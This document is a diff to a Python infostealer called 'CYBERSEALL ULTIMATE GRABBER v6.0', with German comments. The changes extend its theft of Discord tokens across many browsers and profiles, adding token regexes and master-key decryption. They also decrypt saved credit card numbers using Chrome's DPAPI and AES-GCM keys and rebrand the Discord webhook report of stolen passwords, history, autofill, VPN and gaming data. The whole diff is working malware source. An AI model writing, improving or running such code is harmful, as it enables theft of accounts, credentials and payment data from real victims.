@@ -65,13 +65,30 @@ class CyberseallGrabber:
             roaming = os.getenv('APPDATA')
             chrome = local + "\\Google\\Chrome\\User Data"
             
-            paths = {
+            paths = {}
+            
+            # Discord Apps
+            discord_apps = {
                 'Discord': roaming + '\\discord',
                 'Discord Canary': roaming + '\\discordcanary',
-                'Lightcord': roaming + '\\Lightcord',
                 'Discord PTB': roaming + '\\discordptb',
+                'Discord Development': roaming + '\\discorddevelopment',
+                'Lightcord': roaming + '\\Lightcord'
+            }
+            
+            # Browser Apps mit mehreren Profilen
+            browser_bases = {
+                'Chrome': local + '\\Google\\Chrome\\User Data',
+                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+                'Edge': local + '\\Microsoft\\Edge\\User Data',
+                'Edge Beta': local + '\\Microsoft\\Edge Beta\\User Data',
+                'Edge Dev': local + '\\Microsoft\\Edge Dev\\User Data',
+                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
                 'Opera': roaming + '\\Opera Software\\Opera Stable',
                 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+                'Vivaldi': local + '\\Vivaldi\\User Data',
+                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
                 'Amigo': local + '\\Amigo\\User Data',
                 'Torch': local + '\\Torch\\User Data',
                 'Kometa': local + '\\Kometa\\User Data',
@@ -79,28 +96,52 @@ class CyberseallGrabber:
                 'CentBrowser': local + '\\CentBrowser\\User Data',
                 '7Star': local + '\\7Star\\7Star\\User Data',
                 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
-                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-                'Chrome': chrome + '\\Default',
-                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
-                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
-                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-                'Iridium': local + '\\Iridium\\User Data\\Default'
+                'Uran': local + '\\uCozMedia\\Uran\\User Data',
+                'Iridium': local + '\\Iridium\\User Data'
             }
+            
+            # Füge Discord Apps hinzu
+            for name, path in discord_apps.items():
+                if os.path.exists(path):
+                    paths[name] = path
+            
+            # Füge Browser mit Profilen hinzu
+            for browser_name, base_path in browser_bases.items():
+                if os.path.exists(base_path):
+                    # Prüfe verschiedene Profile
+                    for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3']:
+                        profile_path = os.path.join(base_path, profile)
+                        if os.path.exists(profile_path):
+                            paths[f'{browser_name}-{profile}'] = profile_path
+                    
+                    # Fallback für Browser ohne Profile
+                    if browser_name not in [p.split('-')[0] for p in paths.keys()]:
+                        paths[browser_name] = base_path
             
             for platform, path in paths.items():
                 if not os.path.exists(path):
                     continue
-                try:
-                    with open(path + f"\\Local State", "r") as file:
-                        key = json.loads(file.read())['os_crypt']['encrypted_key']
-                        file.close()
-                except: 
+                
+                # Versuche verschiedene Local State Pfade
+                local_state_paths = [
+                    os.path.join(path, "Local State"),
+                    os.path.join(os.path.dirname(path), "Local State")
+                ]
+                
+                key = None
+                for state_path in local_state_paths:
+                    try:
+                        if os.path.exists(state_path):
+                            with open(state_path, "r") as file:
+                                key = json.loads(file.read())['os_crypt']['encrypted_key']
+                                break
+                    except: 
+                        continue
+                
+                if not key:
                     continue
                     
-                leveldb_path = path + f"\\Local Storage\\leveldb\\"
+                leveldb_path = os.path.join(path, "Local Storage", "leveldb")
                 if not os.path.exists(leveldb_path):
                     continue
                     
@@ -108,26 +149,62 @@ class CyberseallGrabber:
                     if not file.endswith(".ldb") and not file.endswith(".log"): 
                         continue
                     try:
-                        with open(leveldb_path + file, "r", errors='ignore') as files:
-                            for x in files.readlines():
-                                x.strip()
-                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
-                                    tokens.append(values)
+                        file_path = os.path.join(leveldb_path, file)
+                        with open(file_path, "r", errors='ignore') as files:
+                            content = files.read()
+                            # Verschiedene Token-Pattern
+                            patterns = [
+                                r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)",
+                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
+                                r"mfa\.[\w-]{84}",
+                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
+                                r"[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}",
+                                r"mfa\.[A-Za-z0-9_-]{84}"
+                            ]
+                            
+                            for pattern in patterns:
+                                matches = re.findall(pattern, content)
+                                for match in matches:
+                                    if match and match not in tokens:
+                                        if pattern.startswith(r"dQw4w9WgXcQ"):
+                                            # Für verschlüsselte Tokens
+                                            tokens.append("dQw4w9WgXcQ:" + match)
+                                        else:
+                                            # Für direkte Tokens
+                                            if not match.startswith("dQw4w9WgXcQ:"):
+                                                tokens.append("dQw4w9WgXcQ:" + match)
+                                            else:
+                                                tokens.append(match)
                     except PermissionError: 
                         continue
             
-            for i in tokens:
-                if i.endswith("\\"):
-                    i = i.replace("\\", "")
-                if i not in cleaned:
-                    cleaned.append(i)
+            for token in tokens:
+                if token:
+                    # Bereinige Token
+                    clean_token = token.strip().replace("\\", "").replace("\n", "").replace("\r", "")
+                    if clean_token and clean_token not in cleaned and len(clean_token) > 10:
+                        cleaned.append(clean_token)
             
             for token in cleaned:
                 try:
-                    tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
-                    if tok != "Error":
-                        checker.append(tok)
-                except:
+                    if 'dQw4w9WgXcQ:' in token:
+                        encrypted_part = token.split('dQw4w9WgXcQ:')[1]
+                        if encrypted_part and key:
+                            try:
+                                decoded_token = base64.b64decode(encrypted_part)
+                                master_key = base64.b64decode(key)[5:]
+                                tok = decrypt(decoded_token, master_key)
+                                if tok != "Error" and len(tok) > 20:
+                                    checker.append(tok)
+                            except:
+                                # Versuche direkten Token
+                                if len(encrypted_part) > 50 and '.' in encrypted_part:
+                                    checker.append(encrypted_part)
+                    else:
+                        # Direkter Token ohne Verschlüsselung
+                        if len(token) > 50 and '.' in token:
+                            checker.append(token)
+                except Exception as e:
                     continue
             
             for value in checker:
@@ -707,17 +784,51 @@ class CyberseallGrabber:
             autofill_data = []
             
 
-            browsers = {
-                'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Web Data"),
-                'Chrome-Profile1': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1", "Web Data"),
-                'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Web Data"),
-                'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Web Data"),
-                'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
-            }
+            browsers = {}
+            
+            # Chrome Varianten
+            chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+            if os.path.exists(chrome_base):
+                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
+                    profile_path = os.path.join(chrome_base, profile, "Web Data")
+                    if os.path.exists(profile_path):
+                        browsers[f'Chrome-{profile}'] = profile_path
+            
+            # Edge Varianten
+            edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
+            if os.path.exists(edge_base):
+                for profile in ["Default", "Profile 1", "Profile 2"]:
+                    profile_path = os.path.join(edge_base, profile, "Web Data")
+                    if os.path.exists(profile_path):
+                        browsers[f'Edge-{profile}'] = profile_path
+            
+            # Brave
+            brave_path = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Web Data")
+            if os.path.exists(brave_path):
+                browsers['Brave'] = brave_path
+            
+            # Opera
+            opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
+            if os.path.exists(opera_path):
+                browsers['Opera'] = opera_path
             
             for browser_name, webdata_path in browsers.items():
                 if os.path.exists(webdata_path):
                     try:
+                        # Hole den Verschlüsselungsschlüssel
+                        browser_base = os.path.dirname(os.path.dirname(webdata_path))
+                        local_state_path = os.path.join(browser_base, "Local State")
+                        
+                        master_key = None
+                        if os.path.exists(local_state_path):
+                            try:
+                                with open(local_state_path, "r", encoding="utf-8") as f:
+                                    local_state = json.loads(f.read())
+                                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                                    master_key = base64.b64decode(encrypted_key)[5:]
+                                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                            except:
+                                pass
 
                         temp_webdata_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_webdata.db")
                         if os.path.exists(temp_webdata_db):
@@ -759,7 +870,22 @@ class CyberseallGrabber:
                             
                             for card in cards:
                                 if card[1] or card[4]:
-                                    card_info = f"CREDIT_CARD_{browser_name} | Name: {card[1] or 'N/A'} | Expires: {card[2] or 'N/A'}/{card[3] or 'N/A'} | Number: [ENCRYPTED] | Modified: {card[5] or 'N/A'}"
+                                    card_number = "[ENCRYPTED]"
+                                    if master_key and card[4]:
+                                        try:
+                                            # Versuche Kreditkartennummer zu entschlüsseln
+                                            if card[4][:3] == b'v10' or card[4][:3] == b'v11':
+                                                iv = card[4][3:15]
+                                                encrypted_data = card[4][15:]
+                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                                decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                                                if decrypted_number and len(decrypted_number) > 10:
+                                                    # Maskiere die Nummer (zeige nur letzte 4 Ziffern)
+                                                    card_number = f"****-****-****-{decrypted_number[-4:]}"
+                                        except:
+                                            pass
+                                    
+                                    card_info = f"CREDIT_CARD_{browser_name} | Name: {card[1] or 'N/A'} | Expires: {card[2] or 'N/A'}/{card[3] or 'N/A'} | Number: {card_number} | Modified: {card[5] or 'N/A'}"
                                     autofill_data.append(card_info)
                         except:
                             pass
@@ -1392,7 +1518,7 @@ module.exports = require('./core.asar');
                 
 
                 with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
-                    f.write("TTS-Spammer Stealth Grabber\n")
+                    f.write("CYBERSEALL ULTIMATE GRABBER v6.0\n")
                     f.write("=" * 60 + "\n\n")
                     f.write("FINAL STATISTICS:\n")
                     f.write(f"Browser Passwords: {len(self.p)}\n")
@@ -1457,7 +1583,7 @@ module.exports = require('./core.asar');
 
             embed_fields = [
                 {
-                    "name": "TTS-Spammer Stealth Stealer",
+                    "name": "CYBERSEALL ULTIMATE GRABBER v6.0",
                     "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}```",
                     "inline": False
                 },
@@ -1544,11 +1670,11 @@ module.exports = require('./core.asar');
             
             embed = {
                 "embeds": [{
-                    "title": "TTS-Spammer Stealth Stealer v6.0",
-                    "description": "**by cyberseall**",
+                    "title": "CYBERSEALL ULTIMATE GRABBER v6.0",
+                    "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
-                    "footer": {"text": "TT-Spammer stealth - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
+                    "footer": {"text": "Cyberseall ULTIMATE v6.0 - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
